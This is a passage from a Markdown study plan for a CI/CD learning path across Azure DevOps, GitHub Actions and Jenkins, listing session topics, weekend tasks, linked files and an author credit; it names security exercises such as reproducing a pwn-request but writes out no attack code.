| **Evening** | H5 GitHub Actions: OIDC decoded, the pwn-request, the reusable workflow<br>⭐ **write up the three-tool translation table from memory** | H8 Jenkins: multibranch + `trustNobody()`, the approval-timeout proof, the hardening audit<br>⭐ **write up the Jenkins security canon from memory** | ⭐⭐ **the chaos run (5 failures, 5 layers)** + the timed rollback drill + `DAY-REPORT.md` |

Then **a fourth day (a weekend)** for the [Capstone](./05-CAPSTONE-END-TO-END.md): the five capstone tasks C.1–C.5, the DORA dashboard, and the runbooks. **That's the version that gets you the job.**

### And the five tasks per case — do them on the following weekends

| Weekend | Tasks | What they prove |
|---|---|---|
| 1 | **1.1–1.5** (Azure DevOps) | a change-aware polyglot matrix · an un-bypassable `extends` template · Key Vault + WIF with zero stored secrets · an SLO gate + a timed rollback drill · a classic→YAML migration with shadow-running and secret **rotation** |
| 2 | **2.1–2.5** (GitHub Actions) | a monorepo dynamic matrix · the narrowest OIDC `sub` with six proofs · the pwn-request reproduced and defeated · a 24 min → 6 min caching win · a reusable library SHA-pinned with Dependabot |
| 3 | **3.1–3.5** (Jenkins) | ephemeral pod agents with 12 isolation proofs · a shared library with a contract test and a breaking-change detector · a production gate proven safe on timeout · hardening a UI-configured instance in priority order · a freestyle→pipeline migration that finds the green-while-broken jobs |
| 4 | **C.1–C.5** (the Capstone) | the cross-tool convergence proof · the Kyverno policy suite with six rejection tests · an AnalysisTemplate tuned against three real scenarios · the DORA dashboard with a per-tool comparison · the chaos day |

---

## Related files

| File | What's in it | When to open it |
|---|---|---|
| [README.md](./README.md) | The index, the three-tool comparison, the app spec, the version anchors | first |
| [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) | 📖 **Read this first** — all 17 theory sections | the night before |
| [02-CASE-1-azure-devops.md](./02-CASE-1-azure-devops.md) | 🔷 H2–H3 in full detail, + Tasks 1.1–1.5 | Day 1 |
| [03-CASE-2-github-actions.md](./03-CASE-2-github-actions.md) | 🐙 H4–H5 in full detail, + Tasks 2.1–2.5 | Day 1 |
| [04-CASE-3-jenkins.md](./04-CASE-3-jenkins.md) | 🔨 H6–H8 in full detail, + Tasks 3.1–3.5 | Day 2 |
| [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) | 🏆 H1, H9, H10 in full detail, + Tasks C.1–C.5 | Day 3–4 |
| [06-CHEATSHEET.md](./06-CHEATSHEET.md) | ⚡ all three tools on one page | **open all day** |
| [../docker-learning-path/](../docker-learning-path/) | 🐳 the images this path builds | when a Dockerfile confuses you |
| [../kubernetes-learning-path/](../kubernetes-learning-path/) | ☸️ the cluster this path deploys to | when a manifest confuses you |
| [../monitoring-alerting-learning-path/](../monitoring-alerting-learning-path/) | 📈 the Prometheus this path's canary analyses query | H10, and the DORA dashboard |

---

<div align="center">

**Created by Harish Kumar Brahmandam**

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Harish_Kumar_Brahmandam-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260)
[![GitHub](https://img.shields.io/badge/GitHub-3558Bhk-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3558Bhk)

🔗 LinkedIn: https://www.linkedin.com/in/harish-kumar-brahmandam-b38a88260
🔗 GitHub: https://github.com/3558Bhk

*Eighteen hours. Three tools. One delivery path. Every defence proven by breaking it.*

</div>
